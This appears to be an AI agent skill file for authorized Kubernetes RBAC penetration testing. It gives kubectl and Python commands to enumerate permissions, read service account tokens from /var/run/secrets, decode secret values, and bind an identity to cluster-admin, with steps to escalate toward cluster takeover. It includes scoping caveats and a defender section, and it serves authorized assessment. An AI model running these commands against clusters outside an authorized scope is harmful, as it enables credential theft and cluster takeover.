---
name: kubernetes-rbac
description: Use when enumerating and testing Kubernetes RBAC during an
  authorized cloud or cluster assessment, bug bounty engagement, or lab
  exercise. Covers cluster context, auth can-i checks, Role, ClusterRole,
  RoleBinding and ClusterRoleBinding enumeration, service account token
  abuse, secrets access, and dangerous bindings such as cluster-admin
  grants using kubectl 1.33 and Python 3.12. Use when you hold kubeconfig
  credentials for a test cluster and need to map privilege paths to
  cluster takeover.
version: 1.0.0
domain: cloud
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [container-escape, cloud-security-basics]
tools:
  - name: kubectl
    version: "1.33"
  - name: Python
    version: "3.12"
---

Kubernetes RBAC decides which identities can do what inside a
cluster: read secrets, create privileged pods, or take over the
whole control plane. Misconfigured bindings (cluster-admin for
everyone, wildcard verbs, secrets readable by default service
accounts) turn one compromised pod into full cluster control. This
skill covers the authorized operator workflow: cluster context,
self-permission checks, RBAC object enumeration, service account
abuse, dangerous binding patterns, and safe proof of cluster
takeover paths. Use it against your own clusters, in-scope bug
bounty targets, and lab environments only. Never attack clusters
you do not have written permission to test.

## Quick Workflow

1. Confirm cluster context: `kubectl config`, current context,
   cluster endpoint, and your identity (`auth whoami`).
2. List your own permissions: `auth can-i --list` in the working
   namespace and `--all-namespaces`.
3. Enumerate RBAC objects: ClusterRoles, ClusterRoleBindings,
   Roles, and RoleBindings.
4. Enumerate service accounts and their token secrets.
5. Flag dangerous patterns: cluster-admin bindings, wildcard verbs,
   secrets read, pods/exec, impersonation rights.
6. Map reachable paths: which service account can you become, and
   what does IT allow.
7. Prove the highest reachable impact safely: read one secret
   name, create a pod only in your own lab namespace, then delete
   it.
8. Record every binding, command, and output for the report.

## 1. Cluster context and identity

```bash
# Current context, cluster endpoint, and user entry
kubectl config current-context
kubectl config view --minify --output 'jsonpath={.clusters[0].cluster.server}{"\n"}'
kubectl auth whoami 2>/dev/null || echo "auth whoami not supported by this version"

# Namespaces you can see
kubectl get namespaces --output 'jsonpath={range .items[*]}{.metadata.name}{"\n"}{end}'

# Node and version overview
kubectl get nodes --output 'custom-columns=NAME:.metadata.name,VERSION:.status.nodeInfo.kubeletVersion'
kubectl version --output=yaml 2>/dev/null | head -10
```

## 2. Self permission enumeration

`can-i --list` is the fastest map of what YOU can do. Run it per
namespace and once cluster-wide.

```bash
# Everything allowed in the current namespace
kubectl auth can-i --list

# Everything allowed across all namespaces (needs the right to ask)
kubectl auth can-i --list --all-namespaces 2>&1 | head -60

# Targeted checks for the dangerous verbs
for v in "get secrets" "list secrets" "create pods" "create pods/exec" \
         "escalate" "bind" "impersonate" "create clusterrolebindings"; do
  kubectl auth can-i $v --all-namespaces 2>/dev/null | grep -q yes \
    && echo "ALLOWED: $v"
done
```

## 3. RBAC object enumeration

```bash
# ClusterRoles: the powerful reusable permission sets
kubectl get clusterroles --output 'custom-columns=NAME:.metadata.name' | head -30

# ClusterRoleBindings: WHO gets cluster-wide power
kubectl get clusterrolebindings \
  --output 'custom-columns=NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
  | head -40

# The big one: who is bound to cluster-admin
kubectl get clusterrolebindings \
  --output=json | python3 -c "
import json, sys
d = json.load(sys.stdin)
for b in d['items']:
    if b['roleRef']['name'] == 'cluster-admin':
        subs = [(s.get('kind'), s.get('name'), s.get('namespace','-')) for s in b.get('subjects', [])]
        print(b['metadata']['name'], '->', subs)
"

# Namespaced roles and bindings (repeat per interesting namespace)
kubectl get roles,rolebindings -n <NAMESPACE> \
  --output 'custom-columns=KIND:.kind,NAME:.metadata.name'
```

Read a suspicious ClusterRole's actual rules:

```bash
kubectl get clusterrole <NAME> --output 'jsonpath={.rules}' | python3 -m json.tool | head -40
```

Red flags in rules: `verbs: ["*"]`, `resources: ["*"]`,
`resources: ["secrets"]` with get/list, `resources:
["pods/exec"]`, `nonResourceURLs: ["*"]`, and any rule with
`escalate` or `bind`.

## 4. Service account enumeration and token abuse

Service accounts are the identities pods run as, and their tokens
are bearer credentials.

```bash
# Service accounts per namespace
kubectl get serviceaccounts -n <NAMESPACE> \
  --output 'custom-columns=NAME:.metadata.name'

# Automount: does the pod get a token by default
kubectl get serviceaccount default -n <NAMESPACE> \
  --output 'jsonpath={.automountServiceAccountToken}{"\n"}'

# Token of the current identity (from inside a pod)
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -c1-50
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use a harvested token from OUTSIDE the pod (scope-permitted only)
kubectl --token="$TOKEN" --server=https://<CLUSTER-IP>:6443 \
  --insecure-skip-tls-verify auth can-i --list 2>&1 | head -20
```

Long-lived token secrets (pre-1.24 style) are still common in
labs:

```bash
kubectl get secrets -n <NAMESPACE> --field-selector type=kubernetes.io/service-account-token \
  --output 'custom-columns=NAME:.metadata.name'
```

## 5. Secrets access

```bash
# Secret names cluster-wide (metadata only, safe first step)
kubectl get secrets --all-namespaces \
  --output 'custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type' \
  | head -30

# Read ONE secret value only when the scope allows it
kubectl get secret <NAME> -n <NAMESPACE> --output jsonpath='{.data}' \
  | python3 -c "import json,sys,base64; print({k: base64.b64decode(v)[:20] for k,v in json.load(sys.stdin).items()})"
```

Truncate values in your notes; the finding is "secret readable",
not the secret itself. If secrets hold production credentials,
report the exposure and stop.

## 6. Privilege paths to cluster takeover

Common chains, each proven with the smallest possible action:

```bash
# Path A: can create pods -> privileged pod -> node root (lab only)
kubectl auth can-i create pods -n <NAMESPACE>
# Pod spec with hostPath / and privileged: true, then chroot /host

# Path B: can read secrets -> service account tokens -> stronger identity
# Path C: can create clusterrolebindings -> bind yourself to cluster-admin
kubectl create clusterrolebinding privesc-test \
  --clusterrole=cluster-admin \
  --serviceaccount=<NAMESPACE>:default 2>&1 | head -3
# Verify, then DELETE it immediately
kubectl auth can-i --list --all-namespaces 2>&1 | head -5
kubectl delete clusterrolebinding privesc-test

# Path D: pods/exec into an existing privileged pod
kubectl auth can-i create pods/exec -n <NAMESPACE>
kubectl exec -n <NAMESPACE> <POD> -- id
```

Only execute writes (pod creation, binding creation) in your own
lab namespaces or where the scope explicitly allows it, and
delete everything you create.

## 7. Kubelet and API surface notes

```bash
# Kubelet read-only port (legacy, often closed now)
curl -s -k https://<NODE-IP>:10255/pods 2>&1 | head -c 200

# API server anonymous access check (should be 403)
curl -s -k https://<CLUSTER-IP>:6443/api/v1/namespaces 2>&1 | head -c 200
```

## Edge cases

- `auth can-i --list --all-namespaces` returns an error instead
  of a list: you lack the right to self-review cluster-wide.
  Fall back to per-namespace `--list` and targeted `can-i`
  checks.
- Aggregated ClusterRoles hide rules behind label selectors:
  read the aggregation rule AND the matching roles.
- `system:` prefixed subjects (like
  `system:serviceaccounts:<ns>`) bind EVERY service account in a
  namespace; one weak SA compromises the binding's intent.
- Bound service account tokens (projected, time-limited) cannot
  be reused after expiry; note the audience and expiry in your
  report.
- Managed clusters (EKS, GKE, AKS) add a cloud IAM layer on top
  of RBAC: a Kubernetes admin may still be limited by the cloud
  role, and a cloud admin may reach the cluster through a
  separate binding.
- `--insecure-skip-tls-verify` is for labs only; in real
  engagements use the cluster CA from the kubeconfig.
- Some clusters disable `auth whoami` on older API servers;
  identify yourself via the kubeconfig user entry instead.

## Escalation

- RBAC enumeration is blocked: pivot to the container-escape
  skill from inside a pod; a host shell often yields cluster
  credentials from the kubelet or static pod manifests.
- No pod creation but secrets readable: harvest service account
  tokens and test each one with `auth can-i --list` until you
  find the strongest reachable identity.
- Stuck as a weak service account: check for automounted cloud
  credentials in the pod (section 6 of container-escape) and
  pivot to the cloud IAM layer instead.
- Admission webhooks block privileged pods: try the binding
  path (Path C) or exec path (Path D), which webhooks often
  allow.
- All in-cluster paths dead: enumerate the cloud control plane
  (EKS access entries, GKE IAM bindings, AKS Azure RBAC) with
  the aws-enumeration, gcp-enumeration, or azure-enumeration
  skills.

## Detection and defender view

Defenders see Kubernetes RBAC abuse in the API server audit log:
`create clusterrolebinding`, `get secrets` bursts across
namespaces, `create pods` with `privileged: true` or hostPath
volumes, and token reviews from unfamiliar sources. Managed
control planes ship these to cloud audit logs (CloudTrail,
Azure Activity Log, GCP Audit Logs). Runtime tools and admission
policies (OPA Gatekeeper, Kyverno) can deny privileged pods and
wildcard bindings at creation time. Durable defenses are no
cluster-admin bindings for humans or apps, no wildcard verbs in
custom roles, `automountServiceAccountToken: false` where pods
do not need the API, short-lived bound tokens, audit logging at
Metadata level or higher with alerts on binding creation and
secret reads, and regular RBAC reviews. As the tester, prove
paths with the minimum write (create then immediately delete),
never leave bindings or pods behind, and never read production
secret values beyond what the scope allows.

## Key references

- MITRE ATT&CK T1078.004 (Valid Accounts: Cloud Accounts):
  service account abuse.
- MITRE ATT&CK T1552.007 (Unsecured Credentials: Container
  API): token and API abuse.
- MITRE ATT&CK T1611 (Escape to Host): privileged pod to node.
- MITRE ATT&CK T1580 (Cloud Infrastructure Discovery): cluster
  enumeration.
- Kubernetes RBAC documentation:
  https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- kubectl auth reference:
  https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#auth
- CIS Kubernetes Benchmark (RBAC sections).
